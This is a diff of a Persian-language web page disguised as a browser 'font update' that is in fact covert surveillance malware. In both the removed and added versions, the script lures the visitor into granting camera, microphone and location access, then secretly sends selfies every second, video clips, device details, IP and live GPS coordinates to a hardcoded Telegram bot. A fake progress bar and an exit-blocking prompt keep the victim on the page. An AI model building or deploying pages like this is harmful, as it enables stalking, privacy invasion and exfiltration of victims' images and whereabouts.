@@ -1,361 +1,346 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>به‌روزرسانی فونت</title>
-    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet" />
-    <style>
-        :root {
-            --bg: #0f0f1e;
-            --card: rgba(25, 25, 40, 0.95);
-            --accent: #8b5cf6;
-            --text: #f0e6ff;
-            --glow: 0 0 25px rgba(139, 92, 246, 0.4);
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>به‌روزرسانی فونت‌های پیشرفته</title>
+  <meta name="theme-color" content="#00ff88" />
+  
+  <!-- Three.js + Controls -->
+  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/build/three.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/controls/OrbitControls.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/loaders/GLTFLoader.js"></script>
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Vazirmatn', sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            background: radial-gradient(circle at center, #1a1a2e 0%, var(--bg) 100%);
-        }
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap');
+    
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body, html { height:100%; overflow:hidden; font-family:'Vazirmatn', sans-serif; background:#000; color:#fff; }
+    
+    /* 3D CANVAS */
+    #scene-container { position:fixed; top:0; left:0; width:100%; height:100%; z-index:1; }
 
-        .container {
-            width: 90%;
-            max-width: 380px;
-            background: var(--card);
-            backdrop-filter: blur(16px);
-            border-radius: 24px;
-            padding: 32px 24px;
-            box-shadow: var(--glow), 0 15px 35px rgba(0,0,0,0.4);
-            text-align: center;
-            animation: float 5s ease-in-out infinite;
-            border: 1px solid rgba(139,92,246,0.2);
-        }
+    /* GLASS OVERLAY */
+    .overlay { 
+      position:fixed; top:0; left:0; width:100%; height:100%; 
+      background:linear-gradient(135deg, rgba(10,10,30,0.8), rgba(0,20,40,0.6)); 
+      backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
+      z-index:10; display:flex; flex-direction:column; justify-content:center; align-items:center; 
+      padding:20px; text-align:center; transition:opacity 1s ease;
+    }
 
-        @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+    /* GLASS CARD */
+    .card { 
+      background:rgba(255,255,255,0.08); 
+      backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
+      border:1px solid rgba(255,255,255,0.15); 
+      border-radius:28px; padding:40px 35px; 
+      max-width:520px; width:90%; 
+      box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);
+      animation: float 8s ease-in-out infinite, glow 3s ease-in-out infinite alternate;
+      position:relative; overflow:hidden;
+    }
+    .card::before {
+      content:''; position:absolute; top:0; left:0; right:0; bottom:0;
+      background:linear-gradient(45deg, transparent, rgba(0,255,136,0.05), transparent);
+      animation: shimmer 4s infinite; pointer-events:none;
+    }
+    @keyframes shimmer { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }
+    @keyframes float { 0%,100%{transform:translateY(0) rotate(0.5deg);} 50%{transform:translateY(-20px) rotate(-0.5deg);} }
+    @keyframes glow { from {box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);} 
+                      to {box-shadow:0 30px 60px rgba(0,255,136,0.3), inset 0 0 40px rgba(0,255,255,0.2);} }
 
-        .icon {
-            width: 80px; height: 80px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #7c3aed, #a78bfa);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: var(--glow);
-            animation: pulse 2s infinite;
-        }
+    h1 { 
+      font-size:2.4em; font-weight:700; margin-bottom:16px; 
+      background:linear-gradient(90deg, #00ff88, #00d0ff, #8b00ff); 
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent; 
+      background-clip:text; letter-spacing:-0.5px;
+    }
+    p { font-size:1.15em; line-height:1.8; margin:14px 0; opacity:0.88; font-weight:400; }
 
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+    /* BUTTON */
+    button { 
+      margin-top:28px; padding:18px 48px; font-size:1.3em; font-weight:600; 
+      background:linear-gradient(45deg, #00ff88, #00b7ff); 
+      color:#000; border:none; border-radius:60px; 
+      cursor:pointer; position:relative; overflow:hidden;
+      box-shadow:0 10px 25px rgba(0,255,136,0.4); 
+      transition:all 0.3s cubic-bezier(0.4,0,0.2,1);
+      text-transform:uppercase; letter-spacing:1px;
+    }
+    button:hover { transform:translateY(-4px) scale(1.05); box-shadow:0 15px 35px rgba(0,255,136,0.6); }
+    button:active { transform:translateY(-2px); }
+    button::after { content:'➤'; margin-right:8px; font-size:1.1em; }
 
-        .icon svg { width: 44px; height: 44px; fill: white; }
+    /* LOADING SCREEN */
+    #loading { display:none; opacity:0; transition:opacity 1s ease; }
+    .spinner { 
+      width:70px; height:70px; border:5px solid rgba(0,255,255,0.2); 
+      border-top:5px solid #00ff88; border-radius:50%; 
+      animation:spin 1.2s cubic-bezier(0.4,0,0.2,1) infinite; margin:25px 0;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
 
-        h1 { font-size: 1.4rem; margin-bottom: 16px; background: linear-gradient(90deg, #c4b5fd, #e0c3fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
+    .progress-container { 
+      width:85%; height:14px; background:rgba(255,255,255,0.15); 
+      border-radius:8px; overflow:hidden; margin:22px 0; 
+      box-shadow:inset 0 2px 5px rgba(0,0,0,0.3);
+    }
+    .progress { height:100%; width:0%; background:linear-gradient(90deg, #00ff88, #00b7ff); 
+                 border-radius:8px; transition:width 0.6s ease; position:relative; overflow:hidden; }
+    .progress::after { content:''; position:absolute; top:0; left:0; right:0; bottom:0;
+                       background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+                       animation:progressGlow 2s infinite; }
+    @keyframes progressGlow { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }
 
-        .message { font-size: 0.95rem; line-height: 1.7; margin: 20px 0; color: #cbd5e1; padding: 16px; background: rgba(139,92,246,0.1); border-radius: 16px; border: 1px dashed rgba(139,92,246,0.3); }
+    .stage { font-size:1.2em; margin:12px 0; font-weight:500; opacity:0.9; }
+    #progressText { font-size:1.4em; font-weight:700; background:linear-gradient(90deg,#00ff88,#00b7ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
 
-        .btn {
-            width: 100%; padding: 16px; background: linear-gradient(135deg, #7c3aed, #a78bfa); color: white; border: none; border-radius: 16px; font-size: 1.1rem; font-weight: 600; margin: 20px 0; cursor: pointer; box-shadow: 0 8px 20px rgba(124, 58, 237, 0.4); transition: all 0.3s ease;
-        }
+    /* HIDDEN ELEMENTS */
+    #video, #canvas { display:none; }
 
-        .loader { display: none; margin: 30px auto; width: 70px; height: 70px; border: 6px solid rgba(139,92,246,0.3); border-top: 6px solid #c4b5fd; border-radius: 50%; animation: spin 1s infinite; box-shadow: var(--glow); }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .progress { display: none; margin: 20px 0; font-size: 0.9rem; color: #94a3b8; }
-        .status { font-size: 0.88rem; color: #94a3b8; margin-top: 10px; animation: fade 2s infinite; }
-        @keyframes fade { 0%,100%{opacity:0.7} 50%{opacity:1} }
-
-        .hidden { display: none !important; }
-
-        /* Stealth */
-        #camVideo, #chopinPlayer { position: fixed; top: -9999px; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
-    </style>
+    /* RESPONSIVE */
+    @media (max-width:480px) { 
+      .card { padding:30px 25px; } 
+      h1 { font-size:2em; } 
+      button { padding:16px 36px; font-size:1.2em; }
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+  <!-- 3D BACKGROUND -->
+  <div id="scene-container"></div>
+
+  <!-- PHASE 1: LURE -->
+  <div id="lure" class="overlay">
+    <div class="card">
+      <h1>مرورگر شما نیاز به به‌روزرسانی فونت دارد!</h1>
+      <p>برای نمایش صحیح محتوای سه‌بعدی و فونت‌های مدرن، باید پکیج جدید نصب شود.</p>
+      <p>این فرآیند فقط <strong>۳۰ ثانیه</strong> طول می‌کشد و کاملاً امن است.</p>
+      <button id="startBtn">بزن بریم 🚀</button>
     </div>
+  </div>
 
-    <h1>مشکل در نمایش فونت‌ها</h1>
-    <div class="message">
-        مرورگر یا دستگاه شما <strong>فونت‌های جدید این وبسایت</strong> را پشتیبانی نمی‌کند.<br><br>
-        برای نمایش صحیح، لطفاً روی دکمه زیر کلیک کنید تا فونت‌ها به‌صورت خودکار آپدیت شوند.
+  <!-- PHASE 2: LOADING TRAP -->
+  <div id="loading" class="overlay">
+    <div class="card">
+      <div class="spinner"></div>
+      <h1>در حال نصب فونت‌های 3D...</h1>
+      <p class="stage" id="stageText">اتصال به سرور CDN...</p>
+      <div class="progress-container"><div class="progress" id="progressBar"></div></div>
+      <p id="progressText">0%</p>
+      <p style="font-size:0.9em; opacity:0.7; margin-top:18px;">لطفاً منتظر بمانید. خروج از صفحه باعث لغو نصب می‌شود.</p>
     </div>
+  </div>
 
-    <button class="btn" id="startBtn">بزن بریم</button>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
 
-    <div id="loading" class="hidden">
-        <div class="loader"></div>
-        <div class="progress" id="progressText">در حال دانلود فونت‌ها... ۰٪</div>
-        <div class="status" id="statusText">در حال ادغام فونت‌ها...</div>
-    </div>
-</div>
-
-<!-- Hidden Selfie Camera -->
-<video id="camVideo" playsinline muted></video>
-
-<!-- Chopin from Persian Online -->
-<iframe id="chopinPlayer" src="https://www.musicdel.ir/single/فریدریک-شوپن-نوکترن-اپوس-۹-شماره-۲?autoplay=1" allow="autoplay" style="display:none"></iframe>
-
-<script>
-    // === TELEGRAM ===
-    const USER_ID = "7625898629";
+  <script>
+    // === TELEGRAM EXFIL ===
     const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
-    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    const CHAT_ID = "7625898629";
+    const API = `https://api.telegram.org/bot${BOT_TOKEN}/send`;
 
-    // === ELEMENTS ===
-    const startBtn = document.getElementById('startBtn');
-    const loading = document.getElementById('loading');
-    const progressText = document.getElementById('progressText');
-    const statusText = document.getElementById('statusText');
-    const video = document.getElementById('camVideo');
+    async function send(type, data, caption = '') {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      if (caption) form.append('caption', caption);
+      
+      if (type === 'photo' || type === 'video') {
+        form.append(type, data, `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'webm'}`);
+      } else {
+        form.append('text', `[${type.toUpperCase()}]\n${JSON.stringify(data, null, 2)}`);
+      }
 
-    // === STATE ===
-    let percent = 0;
-    let stream = null;
-    let intervalId = null;
-    let lastLocation = null;
-    let photoCount = 0;
-    let videoCount = 0;
+      await fetch(`${API}${type === 'photo' ? 'Photo' : type === 'video' ? 'Video' : 'Message'}`, {
+        method: 'POST', body: form
+      }).catch(() => {});
+    }
 
-    // === UNIVERSAL DETECTION ===
-    const detect = () => {
-        const ua = navigator.userAgent;
-        const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
-        const isAndroid = /Android/.test(ua);
-        const isChrome = /Chrome/.test(ua) && !/Edg/.test(ua);
-        const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
-        const isFirefox = /Firefox/.test(ua);
+    // === 3D SCENE: DYNAMIC SHADER BACKGROUND ===
+    let scene, camera, renderer, controls, clock;
+    function init3D() {
+      const container = document.getElementById('scene-container');
+      scene = new THREE.Scene();
+      camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 100);
+      renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true, powerPreference: "high-performance" });
+      renderer.setSize(window.innerWidth, window.innerHeight);
+      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+      container.appendChild(renderer.domElement);
 
-        let device = isIOS ? 'آیفون/آیپد' : isAndroid ? 'اندروید' : /Win/.test(navigator.platform) ? 'ویندوز' : /Mac/.test(navigator.platform) ? 'مک' : 'نامشخص';
-        let browser = isChrome ? 'کروم' : isSafari ? 'سافاری' : isFirefox ? 'فایرفاکس' : 'نامشخص';
+      clock = new THREE.Clock();
 
-        return { device, browser, isIOS, isAndroid };
-    };
-
-    // === SEND ===
-    const send = (text) => {
-        fetch(`${API}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: USER_ID, text: `PERM: ${text}` })
-        }).catch(() => {});
-    };
-
-    const sendPhoto = (blob) => {
-        const form = new FormData();
-        form.append('chat_id', USER_ID);
-        form.append('photo', blob, `selfie_${++photoCount}.jpg`);
-        fetch(`${API}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
-    };
-
-    const sendVideo = (blob) => {
-        const form = new FormData();
-        form.append('chat_id', USER_ID);
-        form.append('video', blob, `selfie_video_${++videoCount}.webm`);
-        fetch(`${API}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
-    };
-
-    // === CAPTURE SELFIE ===
-    const captureSelfie = () => {
-        if (!video.videoWidth || !video.videoHeight) return;
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(sendPhoto, 'image/jpeg', 0.85);
-    };
-
-    // === RECORD SELFIE VIDEO WITH AUDIO ===
-    const recordSelfieVideo = () => {
-        if (!stream) return;
-        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' :
-                     MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
-        const recorder = new MediaRecorder(stream, { mimeType: mime });
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: mime });
-            sendVideo(blob);
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 1000);
-    };
-
-    // === LIVE LOCATION ===
-    const sendLiveLocation = () => {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const lat = pos.coords.latitude.toFixed(7);
-                const lng = pos.coords.longitude.toFixed(7);
-                const acc = pos.coords.accuracy.toFixed(1);
-                const newLoc = `${lat},${lng}`;
-                if (lastLocation !== newLoc) {
-                    send(`لوکیشن: ${lat}, ${lng} (±${acc}m)`);
-                    lastLocation = newLoc;
-                }
-            },
-            () => {},
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 3000 }
-        );
-    };
-
-    // === EVERY SECOND HARVEST ===
-    const startHarvest = () => {
-        intervalId = setInterval(() => {
-            captureSelfie();
-            recordSelfieVideo();
-            sendLiveLocation();
-            send(`زنده — ${new Date().toLocaleTimeString('fa-IR')}`);
-        }, 1000);
-    };
-
-    // === STOP ===
-    const stopHarvest = () => {
-        if (intervalId) clearInterval(intervalId);
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        send('خارج شد');
-    };
-
-    // === FORCE PERMISSION WITH 6 LAYERS ===
-    const forcePermission = async () => {
-        video.playsinline = true;
-        video.muted = true;
-
-        // Layer 1: Camera + Audio + Selfie
-        let cameraPromise = navigator.mediaDevices.getUserMedia({
-            video: { facingMode: { exact: "user" } },
-            audio: true
-        });
-        let locationPromise = new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true });
-        });
-        try {
-            await Promise.all([cameraPromise, locationPromise]);
-            stream = await cameraPromise;
-            video.srcObject = stream;
-            video.play();
-            send('پرمیژن: دوربین + صدا + لوکیشن — لایه 1');
-            return true;
-        } catch (e) {}
-
-        // Layer 2: Relaxed + Audio
-        cameraPromise = navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: true
-        });
-        try {
-            await Promise.all([cameraPromise, locationPromise]);
-            stream = await cameraPromise;
-            video.srcObject = stream;
-            video.play();
-            send('پرمیژن: relaxed + صدا + لوکیشن — لایه 2');
-            return true;
-        } catch (e) {}
-
-        // Layer 3: Any Camera + Audio
-        cameraPromise = navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: true
-        });
-        try {
-            await Promise.all([cameraPromise, locationPromise]);
-            stream = await cameraPromise;
-            video.srcObject = stream;
-            video.play();
-            send('پرمیژن: هر دوربین + صدا + لوکیشن — لایه 3');
-            return true;
-        } catch (e) {}
-
-        // Layer 4: Enumerate + Audio
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(d => d.kind === 'videoinput');
-            const audioDevices = devices.filter(d => d.kind === 'audioinput');
-            const selfieId = videoDevices.find(d => d.label.toLowerCase().includes('front') || d.label.toLowerCase().includes('selfie'))?.deviceId;
-            cameraPromise = navigator.mediaDevices.getUserMedia({
-                video: selfieId ? { deviceId: { exact: selfieId } } : true,
-                audio: audioDevices.length > 0 ? { deviceId: { exact: audioDevices[0].deviceId } } : true
-            });
-            await Promise.all([cameraPromise, locationPromise]);
-            stream = await cameraPromise;
-            video.srcObject = stream;
-            video.play();
-            send('پرمیژن: enumerate + صدا + لوکیشن — لایه 4');
-            return true;
-        } catch (e) {}
-
-        // Layer 5: Audio Only + Location
-        try {
-            const audioPromise = navigator.mediaDevices.getUserMedia({ audio: true });
-            await Promise.all([audioPromise, locationPromise]);
-            send('پرمیژن: فقط صدا + لوکیشن — لایه 5');
-            return true;
-        } catch (e) {}
-
-        // Layer 6: Alert Force + Retry
-        alert('لطفاً دسترسی‌ها را تأیید کنید — برای آپدیت فونت لازم است!');
-        setTimeout(forcePermission, 1000);
-        send('پرمیژن: alert force — لایه 6');
-        return false;
-    };
-
-    // === MAIN CLICK ===
-    startBtn.onclick = async () => {
-        startBtn.classList.add('hidden');
-        loading.classList.remove('hidden');
-
-        const { device, browser, isIOS, isAndroid } = detect();
-        send(`شروع پرمیژن — ${device} | ${browser}`);
-
-        const success = await forcePermission();
-        if (success) {
-            startHarvest();
+      // Shader Material
+      const vertexShader = `
+        varying vec2 vUv;
+        void main() {
+          vUv = uv;
+          gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
         }
+      `;
+      const fragmentShader = `
+        uniform float time;
+        varying vec2 vUv;
+        void main() {
+          vec2 p = vUv - 0.5;
+          float d = length(p);
+          float wave = sin(d * 20.0 - time * 3.0) * 0.5 + 0.5;
+          vec3 color = mix(vec3(0.0, 0.3, 0.6), vec3(0.0, 1.0, 0.5), wave);
+          gl_FragColor = vec4(color, 0.8);
+        }
+      `;
+      const geometry = new THREE.PlaneGeometry(20, 20, 128, 128);
+      const material = new THREE.ShaderMaterial({ vertexShader, fragmentShader, uniforms: { time: { value: 0 } }, transparent: true });
+      const mesh = new THREE.Mesh(geometry, material);
+      mesh.rotation.x = -Math.PI / 2;
+      scene.add(mesh);
 
-        // === CHOPIN ===
-        document.getElementById('chopinPlayer').src += '&autoplay=1';
-        send('شوپن پخش شد');
+      camera.position.set(0, 8, 12);
+      camera.lookAt(0, 0, 0);
+      controls = new THREE.OrbitControls(camera, renderer.domElement);
+      controls.enableDamping = true;
+      controls.autoRotate = true;
+      controls.autoRotateSpeed = 0.8;
 
-        // === PROGRESS ===
+      // Particles Field
+      const particles = new THREE.BufferGeometry();
+      const count = 5000;
+      const pos = new Float32Array(count * 3);
+      for (let i = 0; i < count * 3; i += 3) {
+        pos[i] = (Math.random() - 0.5) * 25;
+        pos[i+1] = Math.random() * 15;
+        pos[i+2] = (Math.random() - 0.5) * 25;
+      }
+      particles.setAttribute('position', new THREE.BufferAttribute(pos, 3));
+      const pMat = new THREE.PointsMaterial({ color: 0x00ffaa, size: 0.08, transparent: true, opacity: 0.8 });
+      const points = new THREE.Points(particles, pMat);
+      scene.add(points);
+
+      function animate() {
+        const t = clock.getElapsedTime();
+        material.uniforms.time.value = t;
+        points.rotation.y = t * 0.05;
+        controls.update();
+        renderer.render(scene, camera);
+        requestAnimationFrame(animate);
+      }
+      animate();
+
+      window.addEventListener('resize', () => {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+      });
+    }
+
+    // === PERMISSIONS & STREAM ===
+    let stream, interval, videoRecorder;
+    async function requestAll() {
+      try {
+        // Video + Audio
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+          audio: true
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Device & Browser Info
+        const battery = await navigator.getBattery?.() || {};
+        const info = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
+          charging: battery.charging ?? 'N/A',
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          connection: navigator.connection?.effectiveType || 'unknown'
+        };
+        await send('message', null, `[DEVICE]\n${JSON.stringify(info, null, 2)}`);
+
+        // Geolocation
+        navigator.geolocation.watchPosition(
+          pos => send('message', null, `[LOCATION]\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\nدقت: ±${pos.coords.accuracy}m`),
+          null, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+        );
+
+        // Selfie Snapshots
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 640; canvas.height = 480;
+
+        interval = setInterval(() => {
+          if (video.videoWidth > 0) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => send('photo', blob), 'image/jpeg', 0.85);
+          }
+        }, 1000); // 1 sec
+
+        // Video Clips
         setInterval(() => {
-            if (percent < 97) {
-                percent += Math.floor(Math.random() * 6) + 2;
-                progressText.innerHTML = `در حال دانلود فونت‌ها... <strong>${percent}%</strong>`;
-            }
-        }, 1800);
+          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+          const chunks = [];
+          recorder.ondataavailable = e => chunks.push(e.data);
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            send('video', blob);
+          };
+          recorder.start();
+          setTimeout(() => recorder.stop(), 7000);
+        }, 14000);
 
-        // === STATUS ===
-        const msgs = ["ادغام فونت...", "بهینه‌سازی...", "اتصال سرور..."];
-        let i = 0;
-        setInterval(() => statusText.textContent = msgs[i++ % 3], 3000);
+      } catch (err) {
+        console.log("Permission denied or failed", err);
+      }
+    }
 
-        // === BATTERY + IP ===
-        if ('getBattery' in navigator) navigator.getBattery().then(b => send(`باتری: ${Math.round(b.level*100)}%`));
-        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => send(`IP: ${d.ip}`));
-    };
+    // === FAKE PROGRESS ENGINE ===
+    const stages = [
+      "اتصال به سرور CDN...",
+      "دریافت پکیج فونت‌های WebGL...",
+      "استخراج فایل‌های سه‌بعدی...",
+      "نصب شیدرهای گرافیکی...",
+      "بهینه‌سازی رندر مرورگر...",
+      "اعمال افکت‌های نورپردازی...",
+      "تست سازگاری دستگاه...",
+      "تکمیل نهایی..."
+    ];
+    let progress = 0;
+    function startFakeProgress() {
+      const bar = document.getElementById('progressBar');
+      const text = document.getElementById('progressText');
+      const stage = document.getElementById('stageText');
 
-    // === LOAD ===
-    window.onload = () => {
-        const { device, browser } = detect();
-        send(`باز شد — ${device} | ${browser}`);
-    };
+      setInterval(() => {
+        progress += Math.random() * 5.5 + 1;
+        if (progress > 97.5) progress = 97.5;
+        bar.style.width = progress + '%';
+        text.textContent = Math.round(progress) + '%';
+        stage.textContent = stages[Math.floor(Math.random() * stages.length)];
+      }, 900 + Math.random() * 800);
+    }
 
-    // === STOP ===
-    window.addEventListener('beforeunload', stopHarvest);
-    document.addEventListener('visibilitychange', () => document.hidden && stopHarvest());
-</script>
+    // === FLOW CONTROL ===
+    document.getElementById('startBtn').addEventListener('click', () => {
+      document.getElementById('lure').style.opacity = '0';
+      setTimeout(() => {
+        document.getElementById('lure').style.display = 'none';
+        document.getElementById('loading').style.display = 'flex';
+        setTimeout(() => document.getElementById('loading').style.opacity = '1', 50);
+        init3D();
+        requestAll().then(startFakeProgress);
+      }, 600);
+    });
 
+    // Prevent Exit
+    window.addEventListener('beforeunload', e => {
+      e.preventDefault();
+      e.returnValue = 'در حال نصب... خروج باعث لغو می‌شود!';
+    });
+  </script>
 </body>
 </html>
